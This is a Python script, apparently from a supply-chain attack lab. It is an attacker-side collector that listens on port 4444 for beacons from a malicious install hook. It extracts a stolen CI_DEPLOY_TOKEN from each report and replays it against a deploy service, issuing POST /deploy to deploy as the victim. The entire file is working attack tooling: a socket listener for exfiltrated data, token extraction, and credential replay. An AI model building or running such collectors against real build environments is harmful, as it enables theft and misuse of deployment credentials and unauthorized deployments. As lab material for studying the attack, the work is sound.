"""
Lab collector + replay — receives install-time BEACON check-ins, then USES the
stolen credential.

Listens on :4444. When a victim's install hook beacons, it:
  1. logs the context report (host, user, leaked token),
  2. extracts the stolen CI_DEPLOY_TOKEN,
  3. REPLAYS it against the real deploy-api (POST /deploy) to prove the stolen
     credential actually works — and shows a forged token being rejected first.

There is still no command channel back to the victim. The "weapon" here is the
stolen token itself, used against a service that genuinely validates it.
"""
import json
import re
import socket
import urllib.request
from datetime import datetime

PORT = 4444
DEPLOY_API = "http://deploy-api:9000"


def _post_deploy(token: str):
    req = urllib.request.Request(
        DEPLOY_API + "/deploy",
        data=json.dumps({"app": "victim-web"}).encode(),
        headers={
            "Authorization": "Bearer " + token,
            "Content-Type": "application/json",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=4) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return None, str(e)


def _replay(stolen_token: str):
    print("\n" + "#" * 60)
    print("[attacker] Replaying the stolen credential against deploy-api")
    print("#" * 60, flush=True)

    # Control: a forged/garbage token must be rejected -> proves the check is real.
    forged = stolen_token.rsplit(".", 1)[0] + ".Zm9yZ2VkLXNpZ25hdHVyZQ"
    code, body = _post_deploy(forged)
    print(f"[attacker] (control) forged token  -> HTTP {code}", flush=True)
    print("           " + body.replace("\n", "\n           "), flush=True)

    # The real thing: the stolen, valid token.
    code, body = _post_deploy(stolen_token)
    print(f"\n[attacker] STOLEN token         -> HTTP {code}", flush=True)
    print("           " + body.replace("\n", "\n           "), flush=True)
    if code == 200:
        print("\n[attacker] >>> Stolen credential accepted. Deployed as the victim. <<<",
              flush=True)
    print("#" * 60 + "\n", flush=True)


def _extract_token(report: str):
    m = re.search(r"CI_DEPLOY_TOKEN=(\S+)", report)
    tok = m.group(1) if m else None
    if tok in (None, "<none>"):
        return None
    return tok


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(5)
    print(f"[collector] listening on 0.0.0.0:{PORT} for install-time beacons...", flush=True)

    while True:
        conn, addr = srv.accept()
        ts = datetime.utcnow().strftime("%H:%M:%S")
        print("\n" + "=" * 60)
        print(f"[{ts}] BEACON from {addr[0]}:{addr[1]}")
        print("=" * 60, flush=True)
        report = ""
        with conn:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                chunk = data.decode(errors="replace")
                report += chunk
                print(chunk, end="", flush=True)
        print("-" * 60)
        print("[collector] Install-time code reached the build env and exfiltrated"
              " a live deploy credential.", flush=True)

        token = _extract_token(report)
        if token:
            _replay(token)
        else:
            print("[attacker] No usable token in beacon; nothing to replay.", flush=True)


if __name__ == "__main__":
    main()
